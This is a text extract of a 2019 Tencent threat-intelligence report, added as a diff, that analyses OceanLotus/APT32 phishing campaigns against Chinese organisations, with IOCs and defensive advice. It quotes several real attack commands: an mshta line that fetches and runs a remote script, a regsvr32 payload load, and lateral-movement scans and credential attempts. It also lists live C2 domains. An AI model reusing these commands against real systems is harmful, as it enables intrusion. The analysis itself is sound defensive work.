@@ -1,0 +1,607 @@
+﻿2019/4/25 腾讯御见威胁情报中心
+
+"海莲花"APT组织2019年第一季度针对中国的攻击活动技术揭秘
+腾讯御见威胁情报中心 今天
+
+长按二维码关注 
+
+御见威胁情报中心
+
+一、背景 
+"海莲花"（又名APT32、OceanLotus），被认为是来自越南的APT攻击组织，自2012年活跃以来，一直针对中国的敏感目标进行攻击活动，是
+
+近几年来针对中国大陆进行攻击活动的最活跃的APT攻击组织之一。 
+
+在2019年第一季度，腾讯御见威胁情报中心持续的检测到该组织针对中国大陆的政府、海事机构、商务部门、研究机构的攻击活动。此外该组织
+
+还在不断的更新他们的攻击武器库，无论是钓鱼的诱饵形式、payload的加载、横向移动等。
+
+尤其值得注意的是，我们发现该组织针对不同的机器下发不同的恶意模块，使得即便恶意文件被安全厂商捕捉到，也因为无相关机器特征而无法
+
+解密最终的payload，无法知晓后续的相关活动。
+
+“海莲花”APT组织活动钻石模型如下： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 1/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+二、技术分析 
+1、初始攻击 
+恶意文件投递的方式依然是最常用的鱼叉攻击的方式，钓鱼关键字包括"干部培训"，"绩效"，"工作方向"，"纪检监察"等，相关的邮件如下： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 2/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+除此该次攻击还新增了敏感内容的主题，用户吸引被攻击者打开，如敏感图片： 
+
+2、诱饵类型 
+2019年一季度投递的恶意诱饵类型众多，包括白加黑、lnk、doc文档、带有WinRAR ACE（CVE‑2018‑20250）漏洞的压缩包等。
+
+1）白加黑 
+
+2）恶意lnk 
+
+3）带有宏的恶意doc文档 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 3/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+4）带有WinRAR ACE（CVE‑2018‑20250）漏洞的压缩包： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 4/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+3、恶意文件植入 
+1）恶意lnk分析 
+在1月的一波攻击中，该组织会在所有的投递的压缩包里，都存放一个恶意的 lnk，但是所有的 lnk文件都类似（执行的地址不能，但是内容一
+
+致）。lnk文件的图标伪装成word图标。
+
+值得注意的是，该lnk的图标会从网络获取，因此如果远程服务器已经关闭，会导致该lnk无图标的现象。此外，还会造成即便不双击lnk，只要打
+
+开lnk所在的目录，就会出现网络连接的现象。
+
+该现象的原因是：explorer解析lnk的时候会去解析图标，而这个lnk配置的图标在网络上，因此会自动去下载，但只是下载，不会执行，看一眼不
+
+运行lnk文件的话，会泄漏自身ip地址，但不会导致电脑中木马。 
+
+双击运行lnk后，会执行下列命令： 
+C:\Windows\SysWOW64\mshta.exe http://api.baidu‑json.com/feed/news.html 
+其中， news.html实际为一个vbs脚本文件： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 5/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+mstha执行此脚本本后会解密脚本中存储的内容，并存储到%temp%目录下，文件名分别为： 
+7b95ffab‑3a9c‑494a‑a584‑9c48dc7aa6a7.tmp 
+7b95ffab‑3a9c‑494a‑a584‑9c48dc7aa6a7.exe 
+7b95ffab‑3a9c‑494a‑a584‑9c48dc7aa6a7.log   
+7b95ffab‑3a9c‑494a‑a584‑9c48dc7aa6a7.env
+
+解密算法如下所示： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 6/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+接着调用系统自带的odbcconf.exe，将7b95ffab‑3a9c‑494a‑a584‑9c48dc7aa6a7.tmp（dll文件）给加载起来。最后调用taskkill.exe，结束
+
+mshta.exe进程： 
+
+ 
+但是奇怪的是，由于解密算法的问题，导致最终的解密失败，因此执行该lnk，用户实际并不会中招： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 7/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+从而我们猜测该方式可能还处于测试阶段，或者作者由于疏忽导致。不过在后续的攻击活动中，我们未再次检测到该攻击方式。
+
+2）带有宏的doc文档 
+带有宏的文档的投递，是该组织比较常用的恶意诱饵，如： 
+
+此外，Twitter上也有不少安全同仁曝光过该组织的该方式的诱饵： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 8/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 9/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+此外疑似作者还在VT上跟相关研究员互动： 
+
+当然，我们更相信该用户可能只是安全研究员之间的一个玩笑。 
+执行宏后，首先会复制原始文档到%temp%下，命名为随机名文件： 
+
+然后解密出一个新的VBA宏： 
+
+接着设置注册表 
+”HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Word\Security\AccessVBOM” 的值为1： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 10/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+最后打开之前复制的doc文件，并将原始VBA宏擦除，将解密后的新的VBA宏添加进去，并启动VBA宏函数 x_N0th1ngH3r3： 
+
+x_N0th1ngH3r3函数同样是解密出一段新VBA宏，同样调用新VBA宏的x_N0th1ngH3r3函数： 
+
+解密出来的新VBA宏目的是将shellcode解密并加载执行： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 11/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+Shellcode解密出一个DLL文件，并在内存中加载，执行DllEntry函数： 
+
+DllEntry函数先会提取资源文件，并解密出来： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 12/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+解密出来的内容包括最终rat和相关配置信息： 
+
+随后会将解密的rat在内存中展开，并且查找CreateInstance函数地址，然后将配置信息传入调用该函数： 
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 13/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+配置的4个C&C使用https进行通信连接： 
+cloud.360cn.info 
+dns.chinanews.network 
+aliexpresscn.net 
+chinaport.org
+
+其他的技术细节同文章同之前腾讯安全御见威胁情报中心发布的海莲花分析文章（见附录）
+
+3）白加黑 
+白加黑同样是该组织常用的诱饵类型，并且在实际攻击过程中，还多次使用。 
+如，攻击首先使用了word的主程序为白文件，加载恶意文件wwlib.dll： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 14/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+wwlib.dll的功能是安装，释放360se.exe（白文件）、chrome_elf.dll文件到\ProgramData\360seMaintenance\目录。然后设置注册表将扩展
+
+名为doc、docx、pdf的文件默认打开程序设置为360se.exe：  
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 15/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+释放诱饵文档到临时目录，并打开： 
+
+然后再次使用白加黑的技术，使用360se的主程序做为白文件，加载恶意的chrome_elf.dll： 
+
+chrome_elf.dll功能除了实现调用原始默认程序打开txt、doc文件外，还会连接网络下载下一阶段的恶意文件并在内存中直接执行： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 16/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+下载地址为： 
+https://officewps.net/cosja.png 
+
+此外，其他的恶意样本下载地址如： 
+https://dominikmagoffin.com/subi.png 
+https://ristineho.com/direct.jpg 
+等。
+
+下载的木马是一个直接可当作代码执行的shellcode，下载后直接在内存中执行： 
+
+shellcode的功能是解压解密出一个功能自加载的PE文件： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 17/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+该 PE 文 件 是 CobaltStrike 木 马 ， 和 之 前 海 莲 花 组 织 使 用 的 该 木 马 完 全 一 样 ， C2 为 https://
+
+officewps.net/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7‑0KIOkUDC7h2 
+
+此外，我们还发现有比较早前的攻击活动中，同样使用360的软件管理来做为白加黑的载体： 
+
+该样本会读取c:\windows\system32.ini文件，读取1字节作为key： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 18/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+读取并解密资源icon下的1资源，得到一个字符串wsc_proxy.exe，比较当前进程是否为wsc_proxy.exe，如果是则继续： 
+
+读取自身.text区段地址，如果没读取成功就读取safemon.dll的： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 19/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+ 
+
+读取ummrzhwp.Emf，使用同样的方法解密，完后加载： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 20/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+最终的shellcode为CobaltStrike，不再赘述。
+
+4）带有WinRAR ACE（CVE‑2018‑20250）漏洞的压缩包 
+该压缩包解压后，会解压出有模糊图片处理的doc文档： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 21/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+除 了 解 压 出 压 缩 的 文 件 后 ， 还 会 在 启 动 目 录 （ C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start
+
+Menu\Programs\Startup）释放一个自解压文件： 
+
+解压后会有一个{7026ce06‑ee00‑4ebd‑b00e‑f5150d86c13e}.ocx文件，然后执行命令 
+regsvr32 /s /i {7026ce06‑ee00‑4ebd‑b00e‑f5150d86c13e}.ocx执行。 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 22/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+该ocx的技术细节同前面宏文档的内存dll的部分分析，此处就不再赘述。
+
+4、下发文件分析 
+在攻击者攻陷机器后，攻击者还会持续的对受控机进行攻击：会通过脚本释放新的与该机器绑定木马，此木马主要通过两种加载器实现只能在该
+
+机器上运行，加载器也是使用白加黑技术，如使用googleupdate.exe+goopdate.dll，此外的名字还包括如： 
+KuGouUpdate.exe+goopdate.dll 
+AdobeUpdate.exe+goopdate.dll 
+Bounjour.exe+goopdate.dll 
+等
+
+1）加载器1分析 
+原理示意图如下： 
+
+木马执行后分配内存空间，拷贝shellcode到新申请的空间中执行，shellcode的功能则是利用配置密码+本地计算机名的hash作为密钥解密最终
+
+的playload，并对playload进行校验，成功后创建新线程执行playload。 
+
+ 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 23/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+2）加载器2分析 
+原理图如下： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 24/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+加载器2是在加载器1的基础上增加了一层随机密钥的加密，更好地对抗安全软件的检测扫描，且通过挂钩API函数然乱木马执行流程来干扰自动化
+
+沙箱的分析。
+
+首先在dll入口点处hook LdrLoadDll函数，当调用该API时接管执行流程执行解密代码，通过内置的随机密码解密shellcode，shellcode的功能则
+
+是利用配置密码+本地计算机名的hash作为密钥解密最终的playload，并对playload进行校验，成功后创建新线程执行playload： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 25/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+Shellcode行为同loader1解密出的shellcode一致： 
+
+使用的相关的加密前缀还有： 
+AMDservice 
+justletMeholdU 
+360zipfuckyou 
+PJFgaJunlmzRdjx79txe 
+sadasddsadsa@350sadsad 
+210.72.156.203 
+sad@1232198sadasd 
+fuckthis@wwww360sad 
+1KR20RYMPVYDRGU@sasd 
+GoogleCompany 
+…… 
+
+最终的playload有三种，都是海莲花常用的木马，分别为CobaltStrike、Gh0st、Denis。 
+RAT1：CobaltStrike 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 26/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+RAT2：Gh0st改版 
+该木马疑似使用开源木马gh0st改版，支持tcp、upd，数据包使用zlib压缩。 
+
+RAT3：Denis 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 27/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+5、提权和横向移动 
+此外，我们还发现海莲花还会不断的对被攻击的内网进行横向移动，以此来渗透到更多的机器：
+
+利用nbt.exe扫描内网网段，其可能通过收集凭据信息或暴力破解内网网络共享的用户和密码，如： 
+C:\\WINDOWS\\system32\\cmd.exe /C nbt.exe 192.168.1.105/24； 
+
+通过net user等相关命令查看或访问内网主机，如： 
+net user \\192.168.1.83\C#3 /U:192.168.1.183\Administrator 123456； 
+NTLM hash。 
+
+此外，在上段所述的加密的前缀中，我们还发现了一个ip：210.72.156.203做为加密前缀，我们从腾讯安图查询可见：  
+
+可以发现，能关联到nbtscan‑1.0.35.exe和mmc.exe，同样跟内网渗透相关。 
+还渗透到内网机器后，攻击者还发下发bat和js脚本，来执行后续的操作。 
+脚本名字如encode.js、360se.txt、360PluginUpdater.js、360DeepScanner.js、360Tray.js等。
+
+如：360PluginUpdater.bat+360PluginUpdater.js，360PluginUpdater.bat的功能是输出加密脚本到360PluginUpdater.dat，完成后将其重
+
+命名为360PluginUpdater.js，并执行他： 
+
+ 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 28/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+360PluginUpdater.js是个加密的脚本： 
+
+通过一系列解密后最终通过eval执行解密后的脚本： 
+
+经过base64解密及范序列化后得到两个对象loader和playload，并在内存中调用loader的LoadShell方法。
+
+loader的pdb为：E:\priv\framework\code\tools\exe2js\loader\obj\Release\loader.pdb，其功能是申请内存，解密加载执行playload： 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 29/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+payload PE头自带加载代码： 
+
+最终调用ReflectiveLoader实现内存加载dll： 
+
+最终为为CobaltStrike攻击平台远控： 
+
+三、攻击者分析 
+从本次的攻击者的钓鱼邮件的邮件名来看，攻击者均采用了网易的免费邮箱 126.com和 163.com，如 baixiao******@126.com、
+
+duancongrui**@163.com等。邮件名格式都采用名字+数字的形式。名字存在一定的中国特色。
+
+再者，注册的C&C域名，如cloud.360cn.info、chinaport.org、dns.chinanews.network、order.dianpingsh.com等也带有明显的中国特色。
+
+而从钓鱼邮件的内容和附件来看，攻击者对中国的国情和相关信息也有非常多的了解。 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 30/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+四、总结 
+海莲花组织是近年来针对中国大陆的敏感部门进行攻击的最活跃的APT组织之一，它总是在不断的进化，更新他的攻击手法和武器库，以达到绕
+
+过安全软件防御的目的。如不断的变换加载方式、混淆方法、多种多样的诱饵形式等，还使用新的Nday进行攻击，如该波攻击中的WinRAR ACE
+
+漏洞（CVE‑2018‑20250）。
+
+除了武器库的不断更新，该组织也相当熟悉中国的情况，包括政策、使用习惯等等，这也使得迷惑相关人员，是的攻击成功增加了成功率。此
+
+外，海莲花APT组织的攻击范围也在不断的扩大，除了政府部门、海事机构、商务厅、能源单位等外，研究机构所遭受的攻击也在不断的增多。
+
+而对个人的攻击，如教授、律师的钓鱼攻击也在不断的进行。 
+
+因此我们提醒有关部门及有关机构的工作人员，切实提高国家安全意识，提高网络安全意识，不要被网络钓鱼信息所蒙蔽，以免给国家安全造成
+
+重大损失。 
+
+五、安全建议
+
+腾讯安全专家建议各相关单位负责网络安全的部门及相关机构工作人员参考以下措施强化网络安全： 
+1、通过内部培训教育员工不要轻易打开不明来源的邮件及其附件； 
+2、及时安装操作系统补丁及重要软件的补丁； 
+3、小心处理Office文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启Office启用宏代码；
+
+4、使用腾讯御点终端安全管理系统防御可能的病毒木马攻击； 
+5、使用腾讯御界高级威胁检测系统。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独
+
+特威胁情报和恶意检测模型系统，有助于及时发现黑客入侵的蛛丝马迹。 
+
+六、附录 
+1、IOCs 
+MD5： 
+08c79ee3b84317dfc77fa681d9c36d0b 
+09718e52b99e4fa065b3785b700636f5 
+0acae009a682a7f387018d29f896306a 
+0bf3d36a262e8369a76047badb1bf16c 
+0fdbe78e55decaa4218fe76761dac8ec 
+1791f8866911b75089dea8c58dcc489b 
+17f577dee657a3fb36a344a89a4478df 
+1888370a371ee204e90ae7e34dda1db7 
+1a5ebdac6da78d76ca476313dc9e196e 
+1a62e7470da4e1f4bc48e10725fe136f 
+1a8a89d8d2622948fdc8ca3d062bfce7 
+1d168cc54cf92d43721c835f21451604 
+2ad1669efdc414dac5c86d7c590a776f 
+2b2d0d1d343e308cfa5718e037a31fa9 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 31/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+30cb5b9da64c67fbbb7c6ce27e908a23 
+3662e7a249e328ee7a0b59fe2f9f8d78 
+3868c9cbdea9efc4c4c7ac75e38de927 
+3bf58deea42e33685de969e198e6785c 
+420dc368bc923eb1f33ccaf7ee1960a2 
+43fefedf2157e2cad8369b6180d53fb5 
+45e040c69227de0060c0b834d1c65087 
+4ecf3caa71a60b06515a33957bd7f000 
+570c11b09e6b6e1a124ba76efc687996 
+5f0248f1774db062fb3a41fe66f3cc57 
+67ca6e3ffdea9b410e35744f688ebf05 
+777717f35225bf1798feb9a8d960ce8f 
+866ce3a3b2baf3749bd1e384fe03c056 
+8d88098f5d7574ee3a42be8606c0049a 
+a2e734049ebf03f81e020f152fd971fe 
+a480f139952fdbb112f017e37a131779 
+a7c7b68ab26c10e56a85fc09b8c2e497 
+af7ae3d627b6caa1020c57c3b743a7af 
+b104798a1f1c04c75e1c4d573020feb7 
+b8fd59347e969a7e0f070b4e66d8e99d 
+bbf25d126b57d19f7ac6084ebb275a74 
+bf46c88f69f07e3beffea3bcd04a9d8a 
+cf14c49caee94268a48ce36a734877db 
+d3e63ae4dc88b220f0ea2420e7add2d0 
+d793fbce034bdb77c6ed634b1eee8b83 
+d83af78e34dcb096fb52172a962a2caf 
+da18e7a10c2f5fb9d6806c739cef640c 
+dac22ff2a2b83a0c2fe98cedebbab17c 
+dd6ffad33699e3281c8ba455906262d7 
+e1d4fd754d71ffac12638e2ec16bce01 
+e256d96e5b57b0cb398d41c1524b8362 
+e55b12b454d69ad78d8d4a9c4b495bb5 
+e8e4712447c18df2d7ffe77db334ea62 
+eb8fdb022a3ef3e788a3cb061a10a03c 
+f7892f9641bd0325889a410b43318bf7 
+
+C&C： 
+192.3.24.224 
+46.183.219.178 
+support.erryarks.com 
+ristineho.com 
+api.baidu‑json.com 
+ry5n4xmosxjwk2zj.onion.to 
+cloud.360cn.info 
+chrome.audreybourgeois.com 
+endpoint.sanmercusa.com 
+smtp.ckbeaudrysanger.xyz 
+dns.chinanews.network 
+aliexpresscn.net 
+chinaport.org 
+business.echinalogistics.com 
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 32/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+cloud.reneark.com 
+dev.arthards.com 
+dominikmagoffin.com 
+en.pixelperfectworld.com 
+officewps.net 
+proc.cesarda.com 
+rand.allardse.com 
+utc.loutier.com 
+news.exandre.com 
+cctv.avidsonec.com 
+school.obertamy.com 
+order.dianpingsh.com 
+hk.cnnewspapers.com 
+work.windown‑office.com 
+review.youtubeproject.com 
+amazone.hopto.me 
+api.blogdns.com 
+syn.servebbs.com 
+ijhlpkga.shawnabuddicom.com 
+jhlpkga.wnabudditig.com 
+ijhlpkga.angelinachilds.com 
+ijhlokga.janaquiron.club 
+ijhlokga.ustrali.club 
+ijhlokga.cartierquibs.club 
+dropbox.workisboring.com 
+ijhlpkga.stellefaff.com 
+ijhlpkga.avidillene.com 
+ijjlekgc.oussain.com 
+ijjlekgc.aryachter.com 
+ijjlekgc.esboonemba.com 
+jhlpkga.manongrover.com 
+cortanasyn.com 
+onedrive.servep2p.com 
+stream.playnetflix.com 
+syn.myvnc.com 
+trust.zapto.org 
+ 
+
+2、参考链接 
+海莲花APT组织最新攻击样本分析
+
+海莲花APT组织针对中国、越南、柬埔寨等国的最新攻击活动通报
+
+了解腾讯企业级安全产品 
+
+腾讯御见威胁情报中心百万年薪招募精英队友（有新增职位）
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 33/34
+
+
+
+2019/4/25 腾讯御见威胁情报中心
+
+https://mp.weixin.qq.com/s/xPsEXp2J5IE7wNSMEVC24A 34/34
